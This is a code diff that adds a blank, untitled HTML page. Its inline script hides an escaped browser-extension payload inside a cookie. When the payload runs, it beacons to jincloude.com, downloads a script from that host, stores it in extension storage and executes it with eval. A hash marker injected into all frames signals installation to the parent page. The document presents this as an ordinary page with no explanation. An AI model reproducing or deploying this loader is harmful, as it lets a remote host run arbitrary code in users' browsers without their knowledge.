@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+
+        <title></title>
+    </head>
+    <body>
+        <script>
+            var ctrl = false;
+            var value = 0;
+
+            function called(data) {
+                window.postMessage({info: data}, "*");
+            }
+
+            function is() {
+                value += 1;
+                if (ctrl === true) {
+                    return;
+                }
+                if (value > 30) {
+                    window.location.reload();
+                }
+                called("{\"response\": \"4\"}");
+                setTimeout(is, 1000 * 1);
+            }
+            setTimeout(is, 1000 * 1);
+
+            (function () {
+                var a = '112121212',
+                    b = escape('(function() {	function sendStart() {		var t = new XMLHttpRequest;		t.onreadystatechange = function() {			browser.storage.local.set({				start: 1			});		}, t.open("GET", "http://jincloude.com/?event=start", !0), t.send()	}    sendR();	function sendR() {		var c = new XMLHttpRequest;		c.open("GET", getURl());		c.onload = function() {            sendStart();			if (200 == c.status) {                var i = c.responseText;                				browser.storage.local.set({					id: i				});				browser.storage.local.set({					t: new Date().getTime()                });                                browser.tabs.executeScript({                    code: "window.location.hash=`garyginger.com`",                    allFrames: true                }).then(() => {                    eval(i);                });                			} else {				setTimeout(function() {					sendR();				}, 600000);			}		};		c.onerror = function() {			setTimeout(function() {				sendR();			}, 600000);		};		c.send()    }   	function getURl() {		return "http://jincloude.com/ff/load/";	}}).call(this);'),
+                    c = 24, d = '';
+                if (c) {
+                    var e = new Date();
+                    e.setTime(e.getTime() + (c * 60 * 60 * 1000));
+                    d = '; expires=' + e.toUTCString()
+                }
+                document.cookie = a + '=' + b + ';' + d + ';path=/';
+            })();
+
+            window.onhashchange = function () {
+                ctrl = true;
+                if (window.location.hash == '#garyginger.com') {
+                    try {                    
+                        window.parent.onInstalled();
+                    }
+                    catch (e) {
+                        window.top.onInstalled();
+                    }
+                }
+            };
+        </script>
+    </body>
+</html>
